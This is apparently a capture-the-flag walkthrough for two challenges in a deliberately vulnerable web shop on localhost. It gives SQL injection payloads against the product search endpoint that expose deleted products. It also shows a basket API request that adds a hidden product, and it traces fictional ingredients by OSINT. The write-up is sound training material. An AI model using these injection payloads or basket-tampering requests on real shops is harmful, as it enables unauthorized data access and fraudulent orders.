# Order the Christmas Special Offer of 2014

## 1. Inspect Product Search Requests

1. Open:

   ```
   http://localhost:3000/#/search
   ```

2. Press **F5** and monitor the **Network** tab in DevTools.

3. Identify the request:

   ```
   GET /rest/products/search?q=
   ```

### Observation

- Product data is retrieved through a single request during page load.
- The search bar appears to filter data already loaded on the client side.
- The `q=` parameter appears unnecessary and may be a leftover from an earlier implementation.

### Screenshot

<img width="1902" height="987" alt="image" src="https://github.com/user-attachments/assets/03faf176-eb08-4921-b1d5-02b3a22a1cdb" />

## 2. Verify Search Endpoint

Call the endpoint directly:

```http
http://localhost:3000/rest/products/search?q=orange
```

Expected result:

```json
[
  {
    "name": "Orange Juice",
    ...
  }
]
```

### Screenshot
<img width="1902" height="1035" alt="image" src="https://github.com/user-attachments/assets/9b101f10-3735-4426-879d-269f895e42d1" />


---

## 3. Test for SQL Injection

Submit:

```http
http://localhost:3000/rest/products/search?q=';
```

Expected result:

```text
SQLITE_ERROR: syntax error
```

This confirms that SQL injection is possible.

### Screenshot
<img width="1907" height="421" alt="image" src="https://github.com/user-attachments/assets/9efe5a0f-16b8-4ee4-9140-1acaae18c433" />

---

## 4. Retrieve Deleted Products

Testing:

```sql
'--
```

produces:

```text
SQLITE_ERROR: incomplete input
```

because the query contains unbalanced parentheses.

Use:

```sql
'))--
```

Request:

```http
http://localhost:3000/rest/products/search?q='))--
```

Expected result:

- Full product list is returned.
- Logically deleted products become visible.
- Identify:

```text
Christmas Super-Surprise-Box (2014 Edition)
```

Record:

```text
ProductId = 10
```

### Screenshot
<img width="1641" height="402" alt="image" src="https://github.com/user-attachments/assets/5af2628d-f5da-427f-8f6c-e3f62076b4ec" />
<img width="1902" height="990" alt="image" src="https://github.com/user-attachments/assets/606ed8ce-3ac6-48dc-8ecd-387cc27272e7" />


---

## 5. Obtain Basket ID

1. Open:

   ```
   http://localhost:3000/#/login
   ```

2. Log in with any valid account.

3. Add a normal product to the basket.

4. Obtain the Basket ID:
   - From a basket-related request in the Network tab, or
   - From Session Storage (`bid` value).

### Screenshot

<img width="1907" height="988" alt="image" src="https://github.com/user-attachments/assets/546890f7-eeed-43b1-b25d-ba7d7769b41c" />

---

## 6. Add the Hidden Product

### Screenshot

<img width="1902" height="927" alt="image" src="https://github.com/user-attachments/assets/fcb85090-42ab-4286-ab8d-91e4f3715d85" />

<img width="1906" height="990" alt="image" src="https://github.com/user-attachments/assets/5f48c2f8-5dbb-45f3-ae55-b8c6dd2b0529" />

---

## 7. Verify Basket Contents

Open:

```
http://localhost:3000/#/basket
```

Confirm that:

```text
Christmas Super-Surprise-Box (2014 Edition)
```

is now present.

### Screenshot

<img width="1902" height="898" alt="image" src="https://github.com/user-attachments/assets/34af05a5-65ce-431e-8535-44647d8e2e42" />
---

## 8. Complete the Challenge

Click:

```text
Checkout
```

Challenge solved.

### Screenshot

<img width="1900" height="860" alt="image" src="https://github.com/user-attachments/assets/0e129d5b-67de-4023-b3ed-d9c66288d43a" />

---

# Alternative Solution (Without SQL Injection)

## Retrieve Complete Product List

Open:

```http
http://localhost:3000/rest/products/search?q=
```

### Steps

1. Review all returned product IDs.
2. Identify missing IDs in the sequence.
3. For each missing ID, send:

```json
{
  "BasketId": "<YOUR_BASKET_ID>",
  "ProductId": "<MISSING_ID>",
  "quantity": 1
}
```

4. Check the basket after each addition.
5. When the **Christmas Super-Surprise-Box (2014 Edition)** appears, proceed to checkout.

---

# Identify an Unsafe Product

## 1. Enumerate Deleted Products

Continue reviewing deleted products until you find:

```text
Rippertuer Special Juice
```

### Screenshot

![Rippertuer Special Juice product page](screenshots/rippertuer-special-juice.png)

---

## 2. Review Product Description

Warning displayed:

```text
This item has been made unavailable because of lack of safety standards.
```

Visible ingredients:

- Cherymoya (*Annona cherimola*)
- Jabuticaba (*Myrciaria cauliflora*)
- Bael (*Aegle marmelos*)
- Others...

### Screenshot

![Unsafe product description](screenshots/unsafe-product-description.png)

---

## 3. Research the Ingredients

Search for:

```text
Cherymoya Annona cherimola Jabuticaba Myrciaria cauliflora Bael Aegle marmelos
```

Find:

```text
Top 20 Fruits You Probably Don't Know
```

In the comments section, locate a reference to:

```text
Rippertuer Special Juice
```

along with a Pastebin link.

### Screenshot

![Blog comment referencing Rippertuer Special Juice](screenshots/blog-comment-reference.png)

---

## 4. Review the Ingredient List

Open the referenced Pastebin entry:

```text
Rippertuer Special Juice Ingredients
```

Examine the JSON document containing fruit descriptions.

### Screenshot

![Pastebin ingredient list](screenshots/pastebin-ingredients.png)

---

## 5. Identify the Dangerous Combination

One entry mentions:

```text
Hueteroneel
```

with the warning:

```text
this coupled with Eurogium Edule was sometimes found fatal
```

Since **Eurogium Edule** is also present in the ingredient list, these are the hazardous ingredients.

### Dangerous Ingredients

- `Hueteroneel`
- `Eurogium Edule`

### Screenshot

![Ingredient warning identifying dangerous combination](screenshots/dangerous-ingredients.png)

---

## 6. Submit the Report

Open:

```
http://localhost:3000/#/contact
```

Submit a comment containing:

```text
Eurogium Edule
Hueteroneel
```

Challenge solved.

### Screenshot

![Submitted contact form](screenshots/contact-form-submission.png)

### Screenshot

![Challenge solved confirmation](screenshots/final-challenge-success.png)

---

# Summary

## Christmas Special Offer

```text
Product: Christmas Super-Surprise-Box (2014 Edition)
Product ID: 10
```

## Unsafe Juice Ingredients

```text
Hueteroneel
Eurogium Edule
```

## Techniques Used

- Network traffic analysis
- API enumeration
- SQL injection discovery
- Hidden product retrieval
- Basket API manipulation
- Open Source Intelligence (OSINT)
- Ingredient correlation and hazard
